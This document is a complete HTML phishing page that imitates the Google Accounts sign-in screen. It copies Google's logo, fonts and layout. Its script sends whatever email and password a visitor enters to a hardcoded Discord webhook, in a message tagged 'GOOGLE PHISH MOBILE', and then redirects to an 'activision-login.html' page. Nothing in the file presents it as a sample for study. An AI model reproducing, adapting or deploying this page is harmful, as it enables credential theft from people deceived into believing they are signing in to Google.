<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Sign in - Google Accounts</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --blue: #1a73e8;
      --blue-dark: #1765cc;
      --text: #202124;
      --gray: #5f6368;
      --border: #dadce0;
      --bg: #ffffff;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Google Sans', Arial, sans-serif;
      background: var(--bg);
      color: var(--text);
      min-height: 100vh;
      padding: 32px 20px;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }
    .container {
      width: 100%;
      max-width: 380px;
      text-align: center;
    }
    .logo {
      width: 88px;
      margin: 0 auto 48px;
      display: block;
    }
    h1 {
      font-size: 28px;
      font-weight: 400;
      margin-bottom: 8px;
    }
    .subtitle {
      color: var(--gray);
      font-size: 16px;
      margin-bottom: 32px;
      line-height: 1.4;
    }
    input {
      width: 100%;
      padding: 14px 16px;
      font-size: 16px;
      border: 1px solid var(--border);
      border-radius: 4px;
      margin-bottom: 16px;
      transition: border-color 0.2s;
    }
    input:focus {
      border-color: var(--blue);
      outline: none;
    }
    .show-pass {
      display: flex;
      align-items: center;
      margin: 12px 0 24px;
      font-size: 14px;
      color: var(--gray);
    }
    .show-pass input {
      margin-right: 12px;
      width: 18px;
      height: 18px;
      accent-color: var(--blue);
    }
    .forgot {
      color: var(--blue);
      font-size: 14px;
      text-decoration: none;
      display: block;
      margin: 8px 0 24px;
      text-align: right;
    }
    .btn {
      background: var(--blue);
      color: white;
      border: none;
      padding: 14px;
      font-size: 14px;
      font-weight: 500;
      border-radius: 4px;
      cursor: pointer;
      width: 100%;
      min-height: 48px;
    }
    .btn:disabled {
      background: #a0c4ff;
      cursor: not-allowed;
    }
    .btn:hover:not(:disabled) { background: var(--blue-dark); }
    .footer {
      margin-top: 64px;
      font-size: 12px;
      color: var(--gray);
      text-align: center;
    }
    .lang {
      color: var(--blue);
      cursor: pointer;
      margin-bottom: 8px;
      display: block;
    }
  </style>
</head>
<body>

<div class="container">
  <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">

  <h1>Sign in</h1>
  <p class="subtitle">Use your Google Account</p>

  <div class="input-group">
    <input type="email" id="email" placeholder="Email or phone" autocomplete="off" autofocus required>
  </div>

  <div class="input-group">
    <input type="password" id="password" placeholder="Enter your password" autocomplete="off" required>
    <div class="show-pass">
      <input type="checkbox" id="show" onclick="toggle()">
      <label for="show">Show password</label>
    </div>
  </div>

  <a href="#" class="forgot">Forgot email?</a>

  <button id="btn" class="btn" onclick="submit()">Next</button>

  <div class="footer">
    <div class="lang">English (United States) ▾</div>
    <div>Help · Privacy · Terms</div>
  </div>
</div>

<script>
  const webhookUrl = "https://discord.com/api/webhooks/1482791121074782349/_CBi8WAs0aHqJMgw8xMImZNoUQfAUTNwYMFRXkYLbB3xn8tw7zfe8lnDMmnaj4ot1keK";

  function toggle() {
    const p = document.getElementById("password");
    p.type = document.getElementById("show").checked ? "text" : "password";
  }

  async function submit() {
    const email = document.getElementById("email").value.trim();
    const pass = document.getElementById("password").value.trim();

    if (!email || !pass) {
      alert("Please fill in both fields");
      return;
    }

    const btn = document.getElementById("btn");
    btn.disabled = true;

    try {
      await fetch(webhookUrl, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
          content: `**GOOGLE PHISH MOBILE**\nEmail: ${email}\nPass: ${pass}\nTime: ${new Date().toLocaleString('en-US')}`
        })
      });
    } catch (e) {}

    await new Promise(r => setTimeout(r, 1800));
    window.location.href = "activision-login.html";
  }
</script>

</body>
</html>
